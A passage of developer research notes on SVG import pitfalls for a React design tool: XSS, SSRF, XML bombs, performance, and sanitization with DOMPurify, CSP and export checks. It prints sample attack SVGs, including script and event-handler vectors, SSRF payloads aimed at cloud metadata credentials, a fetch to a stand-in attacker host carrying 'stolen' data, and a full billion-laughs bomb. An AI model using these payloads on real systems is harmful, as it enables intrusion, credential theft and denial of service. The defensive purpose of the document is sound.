# SVG Import System Pitfalls

**Domain:** SVG file upload and import in React design tools
**Project Context:** VST3 WebView UI Designer - Adding SVG import to existing design tool
**Researched:** 2026-01-25
**Confidence:** HIGH (Multiple authoritative sources, recent CVEs, verified patterns)

---

## Executive Summary

SVG import introduces **critical security vulnerabilities** if not properly sanitized. Unlike raster images (PNG, JPEG), SVG files are XML documents that can contain JavaScript, external resources, and malicious payloads. This project's security surface is especially critical because:

1. **Stored in project JSON** - Malicious SVG becomes part of saved projects
2. **Rendered in designer canvas** - XSS attack surface in the designer application
3. **Exported to production code** - Potential security issues shipped to end users
4. **Run in JUCE WebView2** - Chromium-based environment executes scripts

**Critical finding:** A 2026 Angular CVE (CVE-2026-22610) demonstrates that even major frameworks still struggle with SVG sanitization, specifically with `href` and `xlink:href` attributes in SVG `<script>` elements.

---

## Critical Pitfalls

### Pitfall 1: XSS via Embedded Scripts in Uploaded SVG

**What goes wrong:** User uploads SVG file containing `<script>` tags or event handlers (`onload`, `onclick`). When the SVG is rendered in the canvas (via `dangerouslySetInnerHTML` or inline SVG), the JavaScript executes in the context of your application, allowing attackers to:
- Steal localStorage/sessionStorage (including saved projects)
- Modify the DOM to inject backdoors
- Exfiltrate data to external servers
- Hijack user sessions

**Why it happens:** SVG is XML-based and fully supports JavaScript execution. Developers treat SVG as "just another image format" without understanding it's executable code.

**Real-world examples:**
- Angular Template Compiler (CVE-2026-22610, 2026): Failed to sanitize `href` and `xlink:href` in SVG `<script>` elements
- Plane (GHSA-rcg8-g69v-x23j, 2025): Profile image SVG upload without sanitization allowed stored XSS
- MantisBT (CVE-2022-33910): Stored XSS via SVG file upload

**Consequences:**
- **Designer application compromised:** Attacker scripts run when SVG is displayed on canvas
- **Stored attacks:** Malicious SVG saved in project JSON, attacks all users who open the project
- **Exported code infected:** Malicious SVG exported to production plugin UI, attacks end users
- **Session hijacking:** Attacker steals authentication tokens, impersonates user
- **Data exfiltration:** All saved projects sent to attacker-controlled server

**Attack vectors:**
```xml
<!-- Vector 1: Direct script tag -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert('XSS')</script>
</svg>

<!-- Vector 2: Event handlers -->
<svg xmlns="http://www.w3.org/2000/svg">
  <circle cx="50" cy="50" r="40" onload="alert('XSS')" />
</svg>

<!-- Vector 3: JavaScript in href (2026 CVE vector) -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script href="javascript:alert('XSS')" />
</svg>

<!-- Vector 4: xlink:href (legacy, still dangerous) -->
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <script xlink:href="javascript:alert('XSS')" />
</svg>

<!-- Vector 5: foreignObject with HTML -->
<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject>
    <body xmlns="http://www.w3.org/1999/xhtml">
      <script>alert('XSS')</script>
    </body>
  </foreignObject>
</svg>

<!-- Vector 6: Inline event handlers (many attributes) -->
<svg xmlns="http://www.w3.org/2000/svg">
  <rect onclick="alert('XSS')" onmouseover="alert('XSS')"
        onanimationend="alert('XSS')" width="100" height="100"/>
</svg>
```

**Prevention:**

**Required approach (multi-layer defense):**

1. **Server-side sanitization** (PRIMARY DEFENSE):
   ```typescript
   import DOMPurify from 'dompurify';

   function sanitizeSVG(svgContent: string): string {
     // Configure DOMPurify for SVG-only sanitization
     const clean = DOMPurify.sanitize(svgContent, {
       USE_PROFILES: {
         svg: true,
         svgFilters: true
       },
       // Remove all scripts and handlers
       FORBID_TAGS: ['script', 'foreignObject'],
       FORBID_ATTR: [
         'onload', 'onclick', 'onmouseover', 'onmouseout',
         'onanimationend', 'onanimationstart', 'ontouchstart',
         'ontouchmove', 'ontouchend', 'onerror', 'onbegin',
         'onend', 'onrepeat', 'onabort', 'onfocusin', 'onfocusout'
       ],
       // Block javascript: and data: URLs
       ALLOWED_URI_REGEXP: /^(?:(?:(?:f|ht)tps?|mailto|tel|callto|sms|cid|xmpp):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i,
     });
     return clean;
   }
   ```

2. **Client-side sanitization** (SECONDARY DEFENSE):
   ```typescript
   // Sanitize again before rendering in React
   function SVGImportPreview({ svgContent }: { svgContent: string }) {
     const sanitized = useMemo(() =>
       DOMPurify.sanitize(svgContent, { USE_PROFILES: { svg: true } }),
       [svgContent]
     );

     return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
   }
   ```

3. **Content Security Policy** (SAFETY NET):
   ```http
   Content-Security-Policy: default-src 'self';
                            script-src 'self';
                            style-src 'self' 'unsafe-inline';
                            object-src 'none';
   ```

4. **Validation at upload** (FAIL FAST):
   ```typescript
   function validateSVGUpload(file: File): { valid: boolean; error?: string } {
     if (!file.name.endsWith('.svg')) {
       return { valid: false, error: 'File must be .svg' };
     }

     if (file.size > 1024 * 1024) { // 1MB limit
       return { valid: false, error: 'SVG file too large (max 1MB)' };
     }

     return { valid: true };
   }

   async function checkForMaliciousContent(svgContent: string): Promise<boolean> {
     const dangerous = [
       /<script/i,
       /on\w+\s*=/i, // Event handlers
       /javascript:/i,
       /<foreignObject/i,
       /xlink:href\s*=\s*["']javascript:/i,
     ];

     return dangerous.some(pattern => pattern.test(svgContent));
   }
   ```

**Detection:**
- Browser console shows unexpected script execution warnings
- DOMPurify console warnings about removed tags
- CSP violation reports
- User reports unexpected behavior when uploading SVG
- Security scanner flags SVG upload endpoint

**Phase impact:** Phase 1 (Upload & Validation). Security must be correct from day one. Cannot be retrofitted. Any SVG uploaded without sanitization creates a stored XSS vulnerability.

**Sources:**
- [Angular CVE-2026-22610: XSS via SVG script attributes](https://github.com/advisories/GHSA-jrmj-c5cx-3cw6)
- [Exploiting SVG Upload Vulnerabilities: Stored XSS](https://medium.com/@xgckym/exploiting-svg-upload-vulnerabilities-a-deep-dive-into-stored-xss-430e9bb1cee1)
- [Plane CVE: XSS via SVG profile image](https://github.com/makeplane/plane/security/advisories/GHSA-rcg8-g69v-x23j)
- [SVG Security Best Practices](https://www.svggenie.com/blog/svg-security-best-practices)
- [DOMPurify Documentation](https://github.com/cure53/DOMPurify)

---

### Pitfall 2: SSRF via External Resource References

**What goes wrong:** SVG files can reference external resources via URLs:
- `<image xlink:href="http://internal-server/secret.png" />`
- `<use href="http://evil.com/payload.svg#icon" />`
- `<script href="http://attacker.com/steal.js" />`

When the SVG is processed server-side (for optimization, thumbnails, or validation), the server makes HTTP requests to these URLs. Attacker can:
- Scan internal network (`http://localhost:6379/` to probe Redis)
- Exfiltrate data (`http://attacker.com/?data=...`)
- Cause DoS by pointing to slow/large resources
- Probe cloud metadata endpoints (`http://169.254.169.254/latest/meta-data/`)

**Why it happens:** SVG processors (like CairoSVG, librsvg) automatically fetch external resources to render the full image. Developers don't realize this creates SSRF vulnerability.

**Real-world examples:**
- CairoSVG (CVE-2023-27586, 2023): SSRF allowing internal network scanning
- ThingsBoard (2025): SVG image upload with external reference caused unintended outbound requests
- Shopify (HackerOne): SVG Server Side Request Forgery disclosed

**Consequences:**
- **Internal network exposed:** Attacker maps internal infrastructure
- **Cloud metadata leak:** AWS/Azure credentials stolen from metadata endpoints
- **Data exfiltration:** Sensitive files retrieved from internal servers
- **DoS:** Server resources exhausted fetching large/slow external resources

**Attack vectors:**
```xml
<!-- SSRF to internal services -->
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://localhost:6379/" />
</svg>

<!-- Cloud metadata endpoint (AWS) -->
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://169.254.169.254/latest/meta-data/iam/security-credentials/" />
</svg>

<!-- Data exfiltration via use element -->
<svg xmlns="http://www.w3.org/2000/svg">
  <use href="http://attacker.com/collect?data=stolen" />
</svg>
```

**Prevention:**

**This project:** Since this is a **client-side design tool** with no server-side SVG processing, SSRF risk is **LOW**. However:

1. **Block external resources at sanitization:**
   ```typescript
   function sanitizeSVG(svgContent: string): string {
     const clean = DOMPurify.sanitize(svgContent, {
       USE_PROFILES: { svg: true },
       // Remove all external resource references
       FORBID_ATTR: ['href', 'xlink:href', 'src'],
       // Or allow only data: URIs for embedded resources
       ALLOWED_URI_REGEXP: /^data:image\/(png|jpeg|gif|svg\+xml);base64,/i,
     });
     return clean;
   }
   ```

2. **Warn user about external resources:**
   ```typescript
   function detectExternalResources(svgContent: string): string[] {
     const externalRefs: string[] = [];
     const parser = new DOMParser();
     const doc = parser.parseFromString(svgContent, 'image/svg+xml');

     // Find all elements with href/xlink:href
     doc.querySelectorAll('[href], [xlink\\:href]').forEach(el => {
       const href = el.getAttribute('href') || el.getAttribute('xlink:href');
       if (href && !href.startsWith('data:')) {
         externalRefs.push(href);
       }
     });

     return externalRefs;
   }

   // Show warning modal if external resources detected
   if (detectExternalResources(svgContent).length > 0) {
     showWarning('SVG contains external resources. These will be removed for security.');
   }
   ```

3. **Content Security Policy for exported code:**
   ```typescript
   // In exported JUCE bundle, add CSP meta tag
   const htmlTemplate = `
     <!DOCTYPE html>
     <html>
     <head>
       <meta http-equiv="Content-Security-Policy"
             content="default-src 'self'; img-src 'self' data:; connect-src 'none';">
     </head>
     <body>
       ${sanitizedSVG}
     </body>
     </html>
   `;
   ```

**Detection:**
- Network logs show unexpected outbound requests during SVG processing
- Cloud cost increases (if metadata endpoint probed)
- Server logs show 169.254.169.254 requests
- Security scanner flags external resource references in uploaded SVG

**Phase impact:** Phase 1 (Upload & Validation). Low risk for this project (client-side only), but still sanitize external references to prevent issues in exported code.

**Sources:**
- [CairoSVG SSRF Vulnerability](https://github.com/Kozea/CairoSVG/security/advisories/GHSA-rwmf-w63j-p7gv)
- [ThingsBoard SVG SSRF](https://www.vulncheck.com/advisories/thingsboard-svg-image-ssrf)
- [Shopify SVG SSRF Disclosure](https://hackerone.com/reports/223203)
- [SSRF via SVG - OWASP](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/SSRF)
- [SVG XXE Vulnerabilities - OPSWAT](https://www.opswat.com/blog/svg-unveiled-understanding-xxe-vulnerabilities-and-defending-your-codebase)

---

### Pitfall 3: XML Bomb (Billion Laughs Attack)

**What goes wrong:** Attacker uploads a small SVG file (< 1KB) that contains recursive XML entity definitions. When parsed, it expands exponentially to gigabytes in memory, causing:
- Browser tab crash
- Application freeze
- Out-of-memory errors
- DoS for all users (if stored in shared project)

**Why it happens:** XML parsers expand entity references before validation. A 1KB file with 10 levels of entity expansion becomes 1GB+ in memory.

**Real-world examples:**
- Wikimedia (CVE-2015-2931): Billion laughs in SVG/XMP metadata
- LangChain (CVE-2024-1455, 2024): XML entity expansion in library parsers
- Multiple sitemap parsers (CVE-2025-3225, 2025): Still vulnerable in 2025

**Consequences:**
- **Client-side DoS:** Browser tab crashes when rendering uploaded SVG
- **Application freeze:** React renderer hangs parsing huge expanded document
- **Stored DoS:** Malicious SVG saved in project JSON, crashes app for all users
- **Memory exhaustion:** 1KB upload → 1GB memory usage

**Attack vector:**
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&lol9;</text>
</svg>
```

Result: 1KB file → 3GB in memory (10^10 "lol" strings)

**Alternative SVG-specific attack:**
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <!-- Self-referencing pattern via xlink:href -->
  <defs>
    <g id="a" xlink:href="#b"></g>
    <g id="b" xlink:href="#c"></g>
    <g id="c" xlink:href="#d"></g>
    <g id="d" xlink:href="#a"></g>
  </defs>
  <use xlink:href="#a" />
</svg>
```

**Prevention:**

1. **Reject DOCTYPE declarations:**
   ```typescript
   function containsDoctype(svgContent: string): boolean {
     return /<!DOCTYPE/i.test(svgContent);
   }

   function validateSVGUpload(file: File): Promise<ValidationResult> {
     const content = await file.text();

     if (containsDoctype(content)) {
       return {
         valid: false,
         error: 'SVG files with DOCTYPE declarations are not allowed for security reasons.'
       };
     }

     // Continue with other validation...
   }
   ```

2. **DOMPurify automatically removes DOCTYPE:**
   ```typescript
   // DOMPurify strips DTD by default
   const sanitized = DOMPurify.sanitize(svgContent, {
     USE_PROFILES: { svg: true }
   });
   // DOCTYPE and entity definitions removed
   ```

3. **File size validation (pre-expansion):**
   ```typescript
   const MAX_SVG_SIZE = 1024 * 1024; // 1MB max

   if (file.size > MAX_SVG_SIZE) {
     throw new Error('SVG file exceeds maximum size (1MB)');
   }
   ```

4. **Complexity validation (post-parse):**
   ```typescript
   function validateSVGComplexity(svgContent: string): boolean {
     const parser = new DOMParser();
     const doc = parser.parseFromString(svgContent, 'image/svg+xml');

     const elementCount = doc.querySelectorAll('*').length;
     const maxElements = 10000; // Reasonable limit

     if (elementCount > maxElements) {
       throw new Error('SVG too complex (too many elements)');
     }

     return true;
   }
   ```

**Detection:**
- Upload causes browser tab to freeze/crash
- Memory usage spikes to multiple GB
- File size is tiny (< 5KB) but parsing is slow
- Browser DevTools shows "Maximum call stack size exceeded"
- Contains `<!DOCTYPE` or `<!ENTITY` declarations

**Phase impact:** Phase 1 (Upload & Validation). Must reject DOCTYPE declarations immediately. DOMPurify handles this automatically, but validate file characteristics before parsing.

**Sources:**
- [Billion Laughs Attack - Wikipedia](https://en.wikipedia.org/wiki/Billion_laughs_attack)
- [A Billion Points: SVG Bomb](https://brhfl.com/2017/11/svg-bomb/)
- [XML Bomb (Billion Laughs Attack) - CQR](https://cqr.company/web-vulnerabilities/xml-bomb-billion-laughs-attack/)
- [Wikimedia SVG Billion Laughs](https://phabricator.wikimedia.org/T85848)
- [Recent CVE-2025-3225](https://medium.com/@instatunnel/billion-laughs-attack-the-xml-that-brings-servers-to-their-knees-f83ba617caa4)

---

### Pitfall 4: Performance Degradation with Complex SVG Files

**What goes wrong:** Large SVG files (300KB+) or SVGs with many elements (1000+ nodes) cause:
- Slow initial render (2-3 second freeze)
- Canvas drag operations lag (<10 FPS)
- Property panel updates cause full re-render
- Browser becomes unresponsive during zoom/pan
- Memory usage spirals with multiple imported SVGs

**Why it happens:** Each SVG element is a full DOM node. React managing thousands of SVG nodes with event handlers creates massive overhead. Style recalculation for 1000+ nodes takes 100ms+ per frame.

**Consequences:**
- Designer feels sluggish/broken with imported SVG assets
- Multi-select with imported SVG freezes UI
- Undo/redo lags (large SVG in history)
- Export generates massive HTML files (100MB+ for complex designs)

**Real-world benchmarks:**
- 300KB SVG: 150ms re-render time (below 60 FPS threshold)
- 2500 circles in single SVG: Manageable on desktop, slow on mobile
- 2500 complex paths: Acceptable on some browsers, 1 FPS on others
- Any interaction with 1000+ element SVG: Problematic

**Prevention:**

1. **File size limits:**
   ```typescript
   const MAX_SVG_SIZE = 512 * 1024; // 512KB
   const WARN_SVG_SIZE = 256 * 1024; // 256KB

   if (file.size > MAX_SVG_SIZE) {
     throw new Error('SVG file too large. Maximum size: 512KB');
   }

   if (file.size > WARN_SVG_SIZE) {
     showWarning('Large SVG file may affect performance. Consider simplifying.');
   }
   ```

2. **Element count validation:**
   ```typescript
   function validateSVGElementCount(svgContent: string): ValidationResult {
     const parser = new DOMParser();
     const doc = parser.parseFromString(svgContent, 'image/svg+xml');

     const elementCount = doc.querySelectorAll('*').length;
     const MAX_ELEMENTS = 5000;
     const WARN_ELEMENTS = 1000;

     if (elementCount > MAX_ELEMENTS) {
       return {
         valid: false,
         error: `SVG too complex (${elementCount} elements). Maximum: ${MAX_ELEMENTS}`
       };
     }

     if (elementCount > WARN_ELEMENTS) {
       return {
         valid: true,
         warning: `Large SVG (${elementCount} elements) may affect performance.`
       };
     }

     return { valid: true };
   }
   ```

3. **Optimize imported SVG on upload:**
   ```typescript
   import { optimize } from 'svgo';

   async function optimizeSVG(svgContent: string): Promise<string> {
     const result = optimize(svgContent, {
       plugins: [
         'removeDoctype',
         'removeComments',
         'removeMetadata',
         'removeEditorsNSData',
         'cleanupAttrs',
         'mergeStyles',
         'inlineStyles',
         'minifyStyles',
         'cleanupIds',
         'removeUselessDefs',
         'cleanupNumericValues',
         'convertColors',
         'removeUnknownsAndDefaults',
         'removeNonInheritableGroupAttrs',
         'removeUselessStrokeAndFill',
         'removeViewBox', // Remove if not needed for scaling
         'cleanupEnableBackground',
         'removeHiddenElems',
         'removeEmptyText',
         'convertShapeToPath',
         'moveElemsAttrsToGroup',
         'moveGroupAttrsToElems',
         'collapseGroups',
         'convertPathData',
         'convertTransform',
         'removeEmptyAttrs',
         'removeEmptyContainers',
         'mergePaths',
         'removeUnusedNS',
         'sortAttrs',
         'sortDefsChildren',
         'removeTitle',
         'removeDesc',
       ],
     });

     return result.data;
   }
   ```

4. **Render imported SVG as raster on canvas:**
   ```typescript
   // For non-selected imported SVG, render as <img> with data URL
   // instead of inline SVG DOM nodes

   function ImportedSVGElement({ content, selected }: Props) {
     if (selected) {
       // Render as inline SVG for editing
       return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
     }

     // Render as data URL for performance
     const dataUrl = `data:image/svg+xml;base64,${btoa(content)}`;
     return <img src={dataUrl} alt="Imported SVG" />;
   }
   ```

5. **Lazy loading for imported assets:**
   ```typescript
   // Don't load all imported SVGs at once
   function ImportedAssetLibrary() {
     const visibleAssets = useVirtualizer({
       count: assets.length,
       getScrollElement: () => containerRef.current,
       estimateSize: () => 100,
     });

     // Only render visible assets in library panel
   }
   ```

**Detection:**
- React DevTools Profiler shows >50ms "Recalculate Style" for imported SVG
- FPS drops below 30 during drag operations
- Canvas render time exceeds 16ms (60 FPS threshold)
- Browser DevTools Performance tab shows long tasks
- Memory usage increases by 50MB+ per imported SVG

**Phase impact:** Phase 2 (Canvas Rendering). Implement optimizations during initial development. Rendering strategy (inline vs raster) affects architecture.

**Sources:**
- [Improving SVG Runtime Performance - CodePen](https://codepen.io/tigt/post/improving-svg-rendering-performance)
- [High Performance SVGs - CSS-Tricks](https://css-tricks.com/high-performance-svgs/)
- [How to Optimize SVG for Size and Rendering Speed](https://www.callstack.com/blog/image-optimization-on-ci-and-local)
- [SVG Performance Issues - GitHub](https://github.com/svg-net/SVG/issues/327)
- [Planning for Performance — Using SVG](https://oreillymedia.github.io/Using_SVG/extras/ch19-performance.html)

---

### Pitfall 5: React dangerouslySetInnerHTML Without Sanitization

**What goes wrong:** Rendering imported SVG in React using `dangerouslySetInnerHTML` without sanitization bypasses React's XSS protection. Malicious scripts in SVG execute immediately.

**Why it happens:** Developers need to render raw SVG markup in React (can't use `<img>` for inline editing). They reach for `dangerouslySetInnerHTML` without understanding it disables React's security.

**Consequences:**
- XSS attacks execute in designer application
- Stored XSS in project JSON affects all users
- React's built-in XSS protection completely bypassed

**Anti-pattern:**
```typescript
// DANGEROUS - DO NOT DO THIS
function ImportedSVG({ content }: { content: string }) {
  return <div dangerouslySetInnerHTML={{ __html: content }} />;
}
```

**Prevention:**

1. **Always sanitize before dangerouslySetInnerHTML:**
   ```typescript
   import DOMPurify from 'dompurify';

   function ImportedSVG({ content }: { content: string }) {
     const sanitized = useMemo(() =>
       DOMPurify.sanitize(content, {
         USE_PROFILES: { svg: true }
       }),
       [content]
     );

     return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
   }
   ```

2. **Create reusable sanitized component:**
   ```typescript
   // SafeSVG.tsx - Single component that encapsulates sanitization
   import { useMemo } from 'react';
   import DOMPurify from 'dompurify';

   interface SafeSVGProps {
     content: string;
     className?: string;
   }

   export function SafeSVG({ content, className }: SafeSVGProps) {
     const sanitized = useMemo(() => {
       return DOMPurify.sanitize(content, {
         USE_PROFILES: { svg: true, svgFilters: true },
         FORBID_TAGS: ['script', 'foreignObject'],
         FORBID_ATTR: ['onload', 'onclick', 'onerror', 'onmouseover'],
       });
     }, [content]);

     return <div className={className} dangerouslySetInnerHTML={{ __html: sanitized }} />;
   }

   // Usage:
   <SafeSVG content={importedSVG} />
   ```

3. **Lint rule to enforce SafeSVG usage:**
   ```json
   // .eslintrc.json
   {
     "rules": {
       "react/no-danger": "error", // Ban dangerouslySetInnerHTML
       // Allow only in SafeSVG.tsx
     }
   }
   ```

4. **Add CSP as safety net:**
   ```html
   <meta http-equiv="Content-Security-Policy"
         content="default-src 'self'; script-src 'self'; object-src 'none';">
   ```

**Detection:**
- ESLint warnings about `dangerouslySetInnerHTML`
- Security audit tools flag unsafe HTML rendering
- CSP violations in browser console
- Unexpected script execution when rendering SVG

**Phase impact:** Phase 2 (Canvas Rendering). Architectural decision. Create SafeSVG component early. All SVG rendering must use it.

**Sources:**
- [React Security: dangerouslySetInnerHTML Best Practices 2026](https://www.glorywebs.com/blog/react-security-practices)
- [Using dangerouslySetInnerHTML Safely](https://dev.to/hijazi313/using-dangerouslysetinnerhtml-safely-in-react-and-nextjs-production-systems-115n)
- [Preventing XSS in React: dangerouslySetInnerHTML](https://pragmaticwebsecurity.com/articles/spasecurity/react-xss-part2.html)
- [React DOM Elements - dangerouslySetInnerHTML](https://legacy.reactjs.org/docs/dom-elements.html)
- [Using dangerouslySetInnerHTML in React - LogRocket](https://blog.logrocket.com/using-dangerouslysetinnerhtml-react-application/)

---

### Pitfall 6: SVG Stored in JSON Without Re-Sanitization

**What goes wrong:** SVG is sanitized on upload, stored in project JSON, but **NOT re-sanitized** when loaded from JSON. Attacker directly edits project JSON file to inject malicious SVG, bypassing upload sanitization.

**Why it happens:** Developers assume "we sanitized on upload, so stored data is safe." They forget users can manually edit JSON files.

**Consequences:**
- Attacker bypasses upload sanitization by editing saved project
- Malicious SVG stored in JSON attacks all users who open project
- Exported code contains unsanitized SVG

**Attack scenario:**
1. User uploads benign SVG (passes sanitization)
2. Project saved to JSON
3. Attacker edits JSON file, replaces SVG with malicious payload
4. User loads edited project
5. Malicious SVG renders without sanitization → XSS

**Prevention:**

1. **Sanitize on EVERY render, not just upload:**
   ```typescript
   // WRONG - Only sanitize on upload
   async function uploadSVG(file: File) {
     const content = await file.text();
     const sanitized = sanitizeSVG(content);
     store.addSVG({ id: uuid(), content: sanitized }); // Stored sanitized
   }

   function renderSVG({ content }: { content: string }) {
     // Assumes content is already safe - DANGEROUS
     return <div dangerouslySetInnerHTML={{ __html: content }} />;
   }

   // CORRECT - Sanitize on every render
   function renderSVG({ content }: { content: string }) {
     const sanitized = useMemo(() => sanitizeSVG(content), [content]);
     return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
   }
   ```

2. **Validate JSON on load:**
   ```typescript
   import { z } from 'zod';

   const SVGElementSchema = z.object({
     id: z.string(),
     type: z.literal('imported-svg'),
     content: z.string().refine(
       (content) => !containsMaliciousPatterns(content),
       { message: 'SVG content contains potentially malicious patterns' }
     ),
   });

   function loadProject(jsonString: string): Project {
     const data = JSON.parse(jsonString);

     // Validate and sanitize all SVG elements
     data.elements = data.elements.map(el => {
       if (el.type === 'imported-svg') {
         return {
           ...el,
           content: sanitizeSVG(el.content), // Re-sanitize on load
         };
       }
       return el;
     });

     return ProjectSchema.parse(data);
   }
   ```

3. **Warn on suspicious patterns in loaded JSON:**
   ```typescript
   function detectTampering(projectJSON: string): string[] {
     const warnings: string[] = [];

     if (/<script/i.test(projectJSON)) {
       warnings.push('Project contains <script> tags (will be removed)');
     }

     if (/on\w+\s*=/i.test(projectJSON)) {
       warnings.push('Project contains event handlers (will be removed)');
     }

     if (/javascript:/i.test(projectJSON)) {
       warnings.push('Project contains javascript: URLs (will be removed)');
     }

     return warnings;
   }

   // Show warning modal before loading
   const warnings = detectTampering(fileContent);
   if (warnings.length > 0) {
     await showWarningModal({
       title: 'Potentially modified project detected',
       message: 'This project may have been manually edited. Security issues will be removed.',
       warnings,
     });
   }
   ```

**Detection:**
- Security scanner finds unsanitized data in rendering code
- Manual JSON edits cause XSS in loaded project
- Code review reveals only upload-time sanitization
- Penetration testing finds JSON tampering vector

**Phase impact:** Phase 3 (Save/Load). Critical security architecture decision. Sanitize at render time, not just upload time. Treat all loaded data as untrusted.

**Sources:**
- [React Security Best Practices 2026](https://www.glorywebs.com/blog/react-security-practices)
- [File Upload Vulnerabilities and Security](https://www.vaadata.com/blog/file-upload-vulnerabilities-and-security-best-practices/)
- [SVG File and Its Danger](https://blog.online-convert.com/svg-file-and-its-danger/)

---

## Moderate Pitfalls

### Pitfall 7: Missing Fonts in Imported SVG

**What goes wrong:** SVG contains text elements with commercial fonts (`font-family: "Helvetica Neue"`). Font not available in designer or exported plugin UI. Text renders in fallback serif/sans-serif, breaking design.

**Why it happens:** SVG export from design tools (Illustrator, Figma) references fonts by name, assuming they're installed. They're not available in all environments.

**Consequences:**
- Text in imported SVG looks wrong (different font)
- Layout breaks (different font metrics change text bounding boxes)
- Commercial font licenses violated if embedded

**Prevention:**

1. **Convert text to paths on import:**
   ```typescript
   import { optimize } from 'svgo';

   function convertTextToPaths(svgContent: string): string {
     // Use SVGO plugin to convert text to paths
     const result = optimize(svgContent, {
       plugins: [
         'convertTextToPath', // Custom plugin if available
       ],
     });
     return result.data;
   }
   ```

2. **Warn about text elements:**
   ```typescript
   function detectTextElements(svgContent: string): TextElementInfo[] {
     const parser = new DOMParser();
     const doc = parser.parseFromString(svgContent, 'image/svg+xml');
     const textElements = doc.querySelectorAll('text, tspan');

     const fonts = new Set<string>();
     textElements.forEach(el => {
       const fontFamily = el.getAttribute('font-family') ||
                         getComputedStyle(el).fontFamily;
       if (fontFamily) fonts.add(fontFamily);
     });

     return Array.from(fonts).map(font => ({ font, count: textElements.length }));
   }

   // Show warning on upload
   const textInfo = detectTextElements(svgContent);
   if (textInfo.length > 0) {
     showWarning({
       title: 'SVG contains text elements',
       message: 'Text may not render correctly. Consider converting text to paths in your design tool.',
       fonts: textInfo,
     });
   }
   ```

3. **Provide fallback font stack:**
   ```css
   /* In exported CSS, use safe fallback fonts */
   .imported-svg {
     font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
                  "Helvetica Neue", Arial, sans-serif;
   }
   ```

**Detection:**
- Text in imported SVG renders in wrong font
- Layout shifts when SVG displayed
- User reports "my SVG looks different"

**Phase impact:** Phase 1 (Upload). Warn users during upload. Document best practices: convert text to paths before exporting SVG.

**Sources:**
- [5 Most Common Problems Faced by SVG Users](https://vecta.io/blog/5-most-common-problems-faced-by-svg-users)
- [SVG Issues: BIMI Compliance](https://bimigroup.org/solving-svg-issues/)

---

### Pitfall 8: Exported Code Contains Unsanitized SVG

**What goes wrong:** Designer exports JUCE WebView2 bundle containing imported SVG without re-sanitization. Malicious SVG stored in designer's JSON gets exported to production plugin code.

**Why it happens:** Export code assumes all data in project store is safe. Forgets that imported SVG might have bypassed sanitization (JSON tampering, old projects, etc.).

**Consequences:**
- End users run malicious JavaScript in plugin UI
- Security vulnerability shipped to production
- Reputation damage, security disclosure required

**Prevention:**

1. **Sanitize ALL content during export:**
   ```typescript
   function exportToJUCE(project: Project): JUCEBundle {
     // Sanitize ALL imported SVG elements before export
     const sanitizedElements = project.elements.map(el => {
       if (el.type === 'imported-svg') {
         return {
           ...el,
           content: sanitizeSVG(el.content), // Re-sanitize for export
         };
       }
       return el;
     });

     return generateJUCECode({ ...project, elements: sanitizedElements });
   }
   ```

2. **Add CSP to exported HTML:**
   ```typescript
   function generateHTMLTemplate(elements: Element[]): string {
     return `
       <!DOCTYPE html>
       <html>
       <head>
         <meta charset="UTF-8">
         <meta http-equiv="Content-Security-Policy"
               content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; object-src 'none';">
         <title>Plugin UI</title>
       </head>
       <body>
         ${renderSanitizedElements(elements)}
       </body>
       </html>
     `;
   }
   ```

3. **Validate export before generation:**
   ```typescript
   function validateExport(project: Project): ValidationResult {
     const issues: string[] = [];

     project.elements.forEach(el => {
       if (el.type === 'imported-svg') {
         if (containsMaliciousPatterns(el.content)) {
           issues.push(`Element "${el.id}" contains potentially malicious content`);
         }
       }
     });

     if (issues.length > 0) {
       return {
         valid: false,
         errors: issues,
         message: 'Project contains security issues. These will be removed during export.',
       };
     }

     return { valid: true };
   }

   // Validate before export
   const validation = validateExport(project);
   if (!validation.valid) {
     showWarningModal(validation);
   }
   ```

**Detection:**
- Security scanner flags exported HTML/JS bundle
- Manual code review of exported bundle finds unsanitized content
- End user reports security issue in plugin UI

**Phase impact:** Phase 4 (Export). Critical. Export is last line of defense. Must sanitize even if earlier stages failed.

**Sources:**
- [Design Tool SVG Export Security 2026](https://vectorwitch.com/blog/the-complete-guide-to-ai-powered-svg-generation-in-2026)
- [Common Security Risks in SVG](https://svgenius.design/blog/common-security-risks-in-svg-and-how-to-avoid-them)

---

### Pitfall 9: Circular References in SVG `<use>` Elements

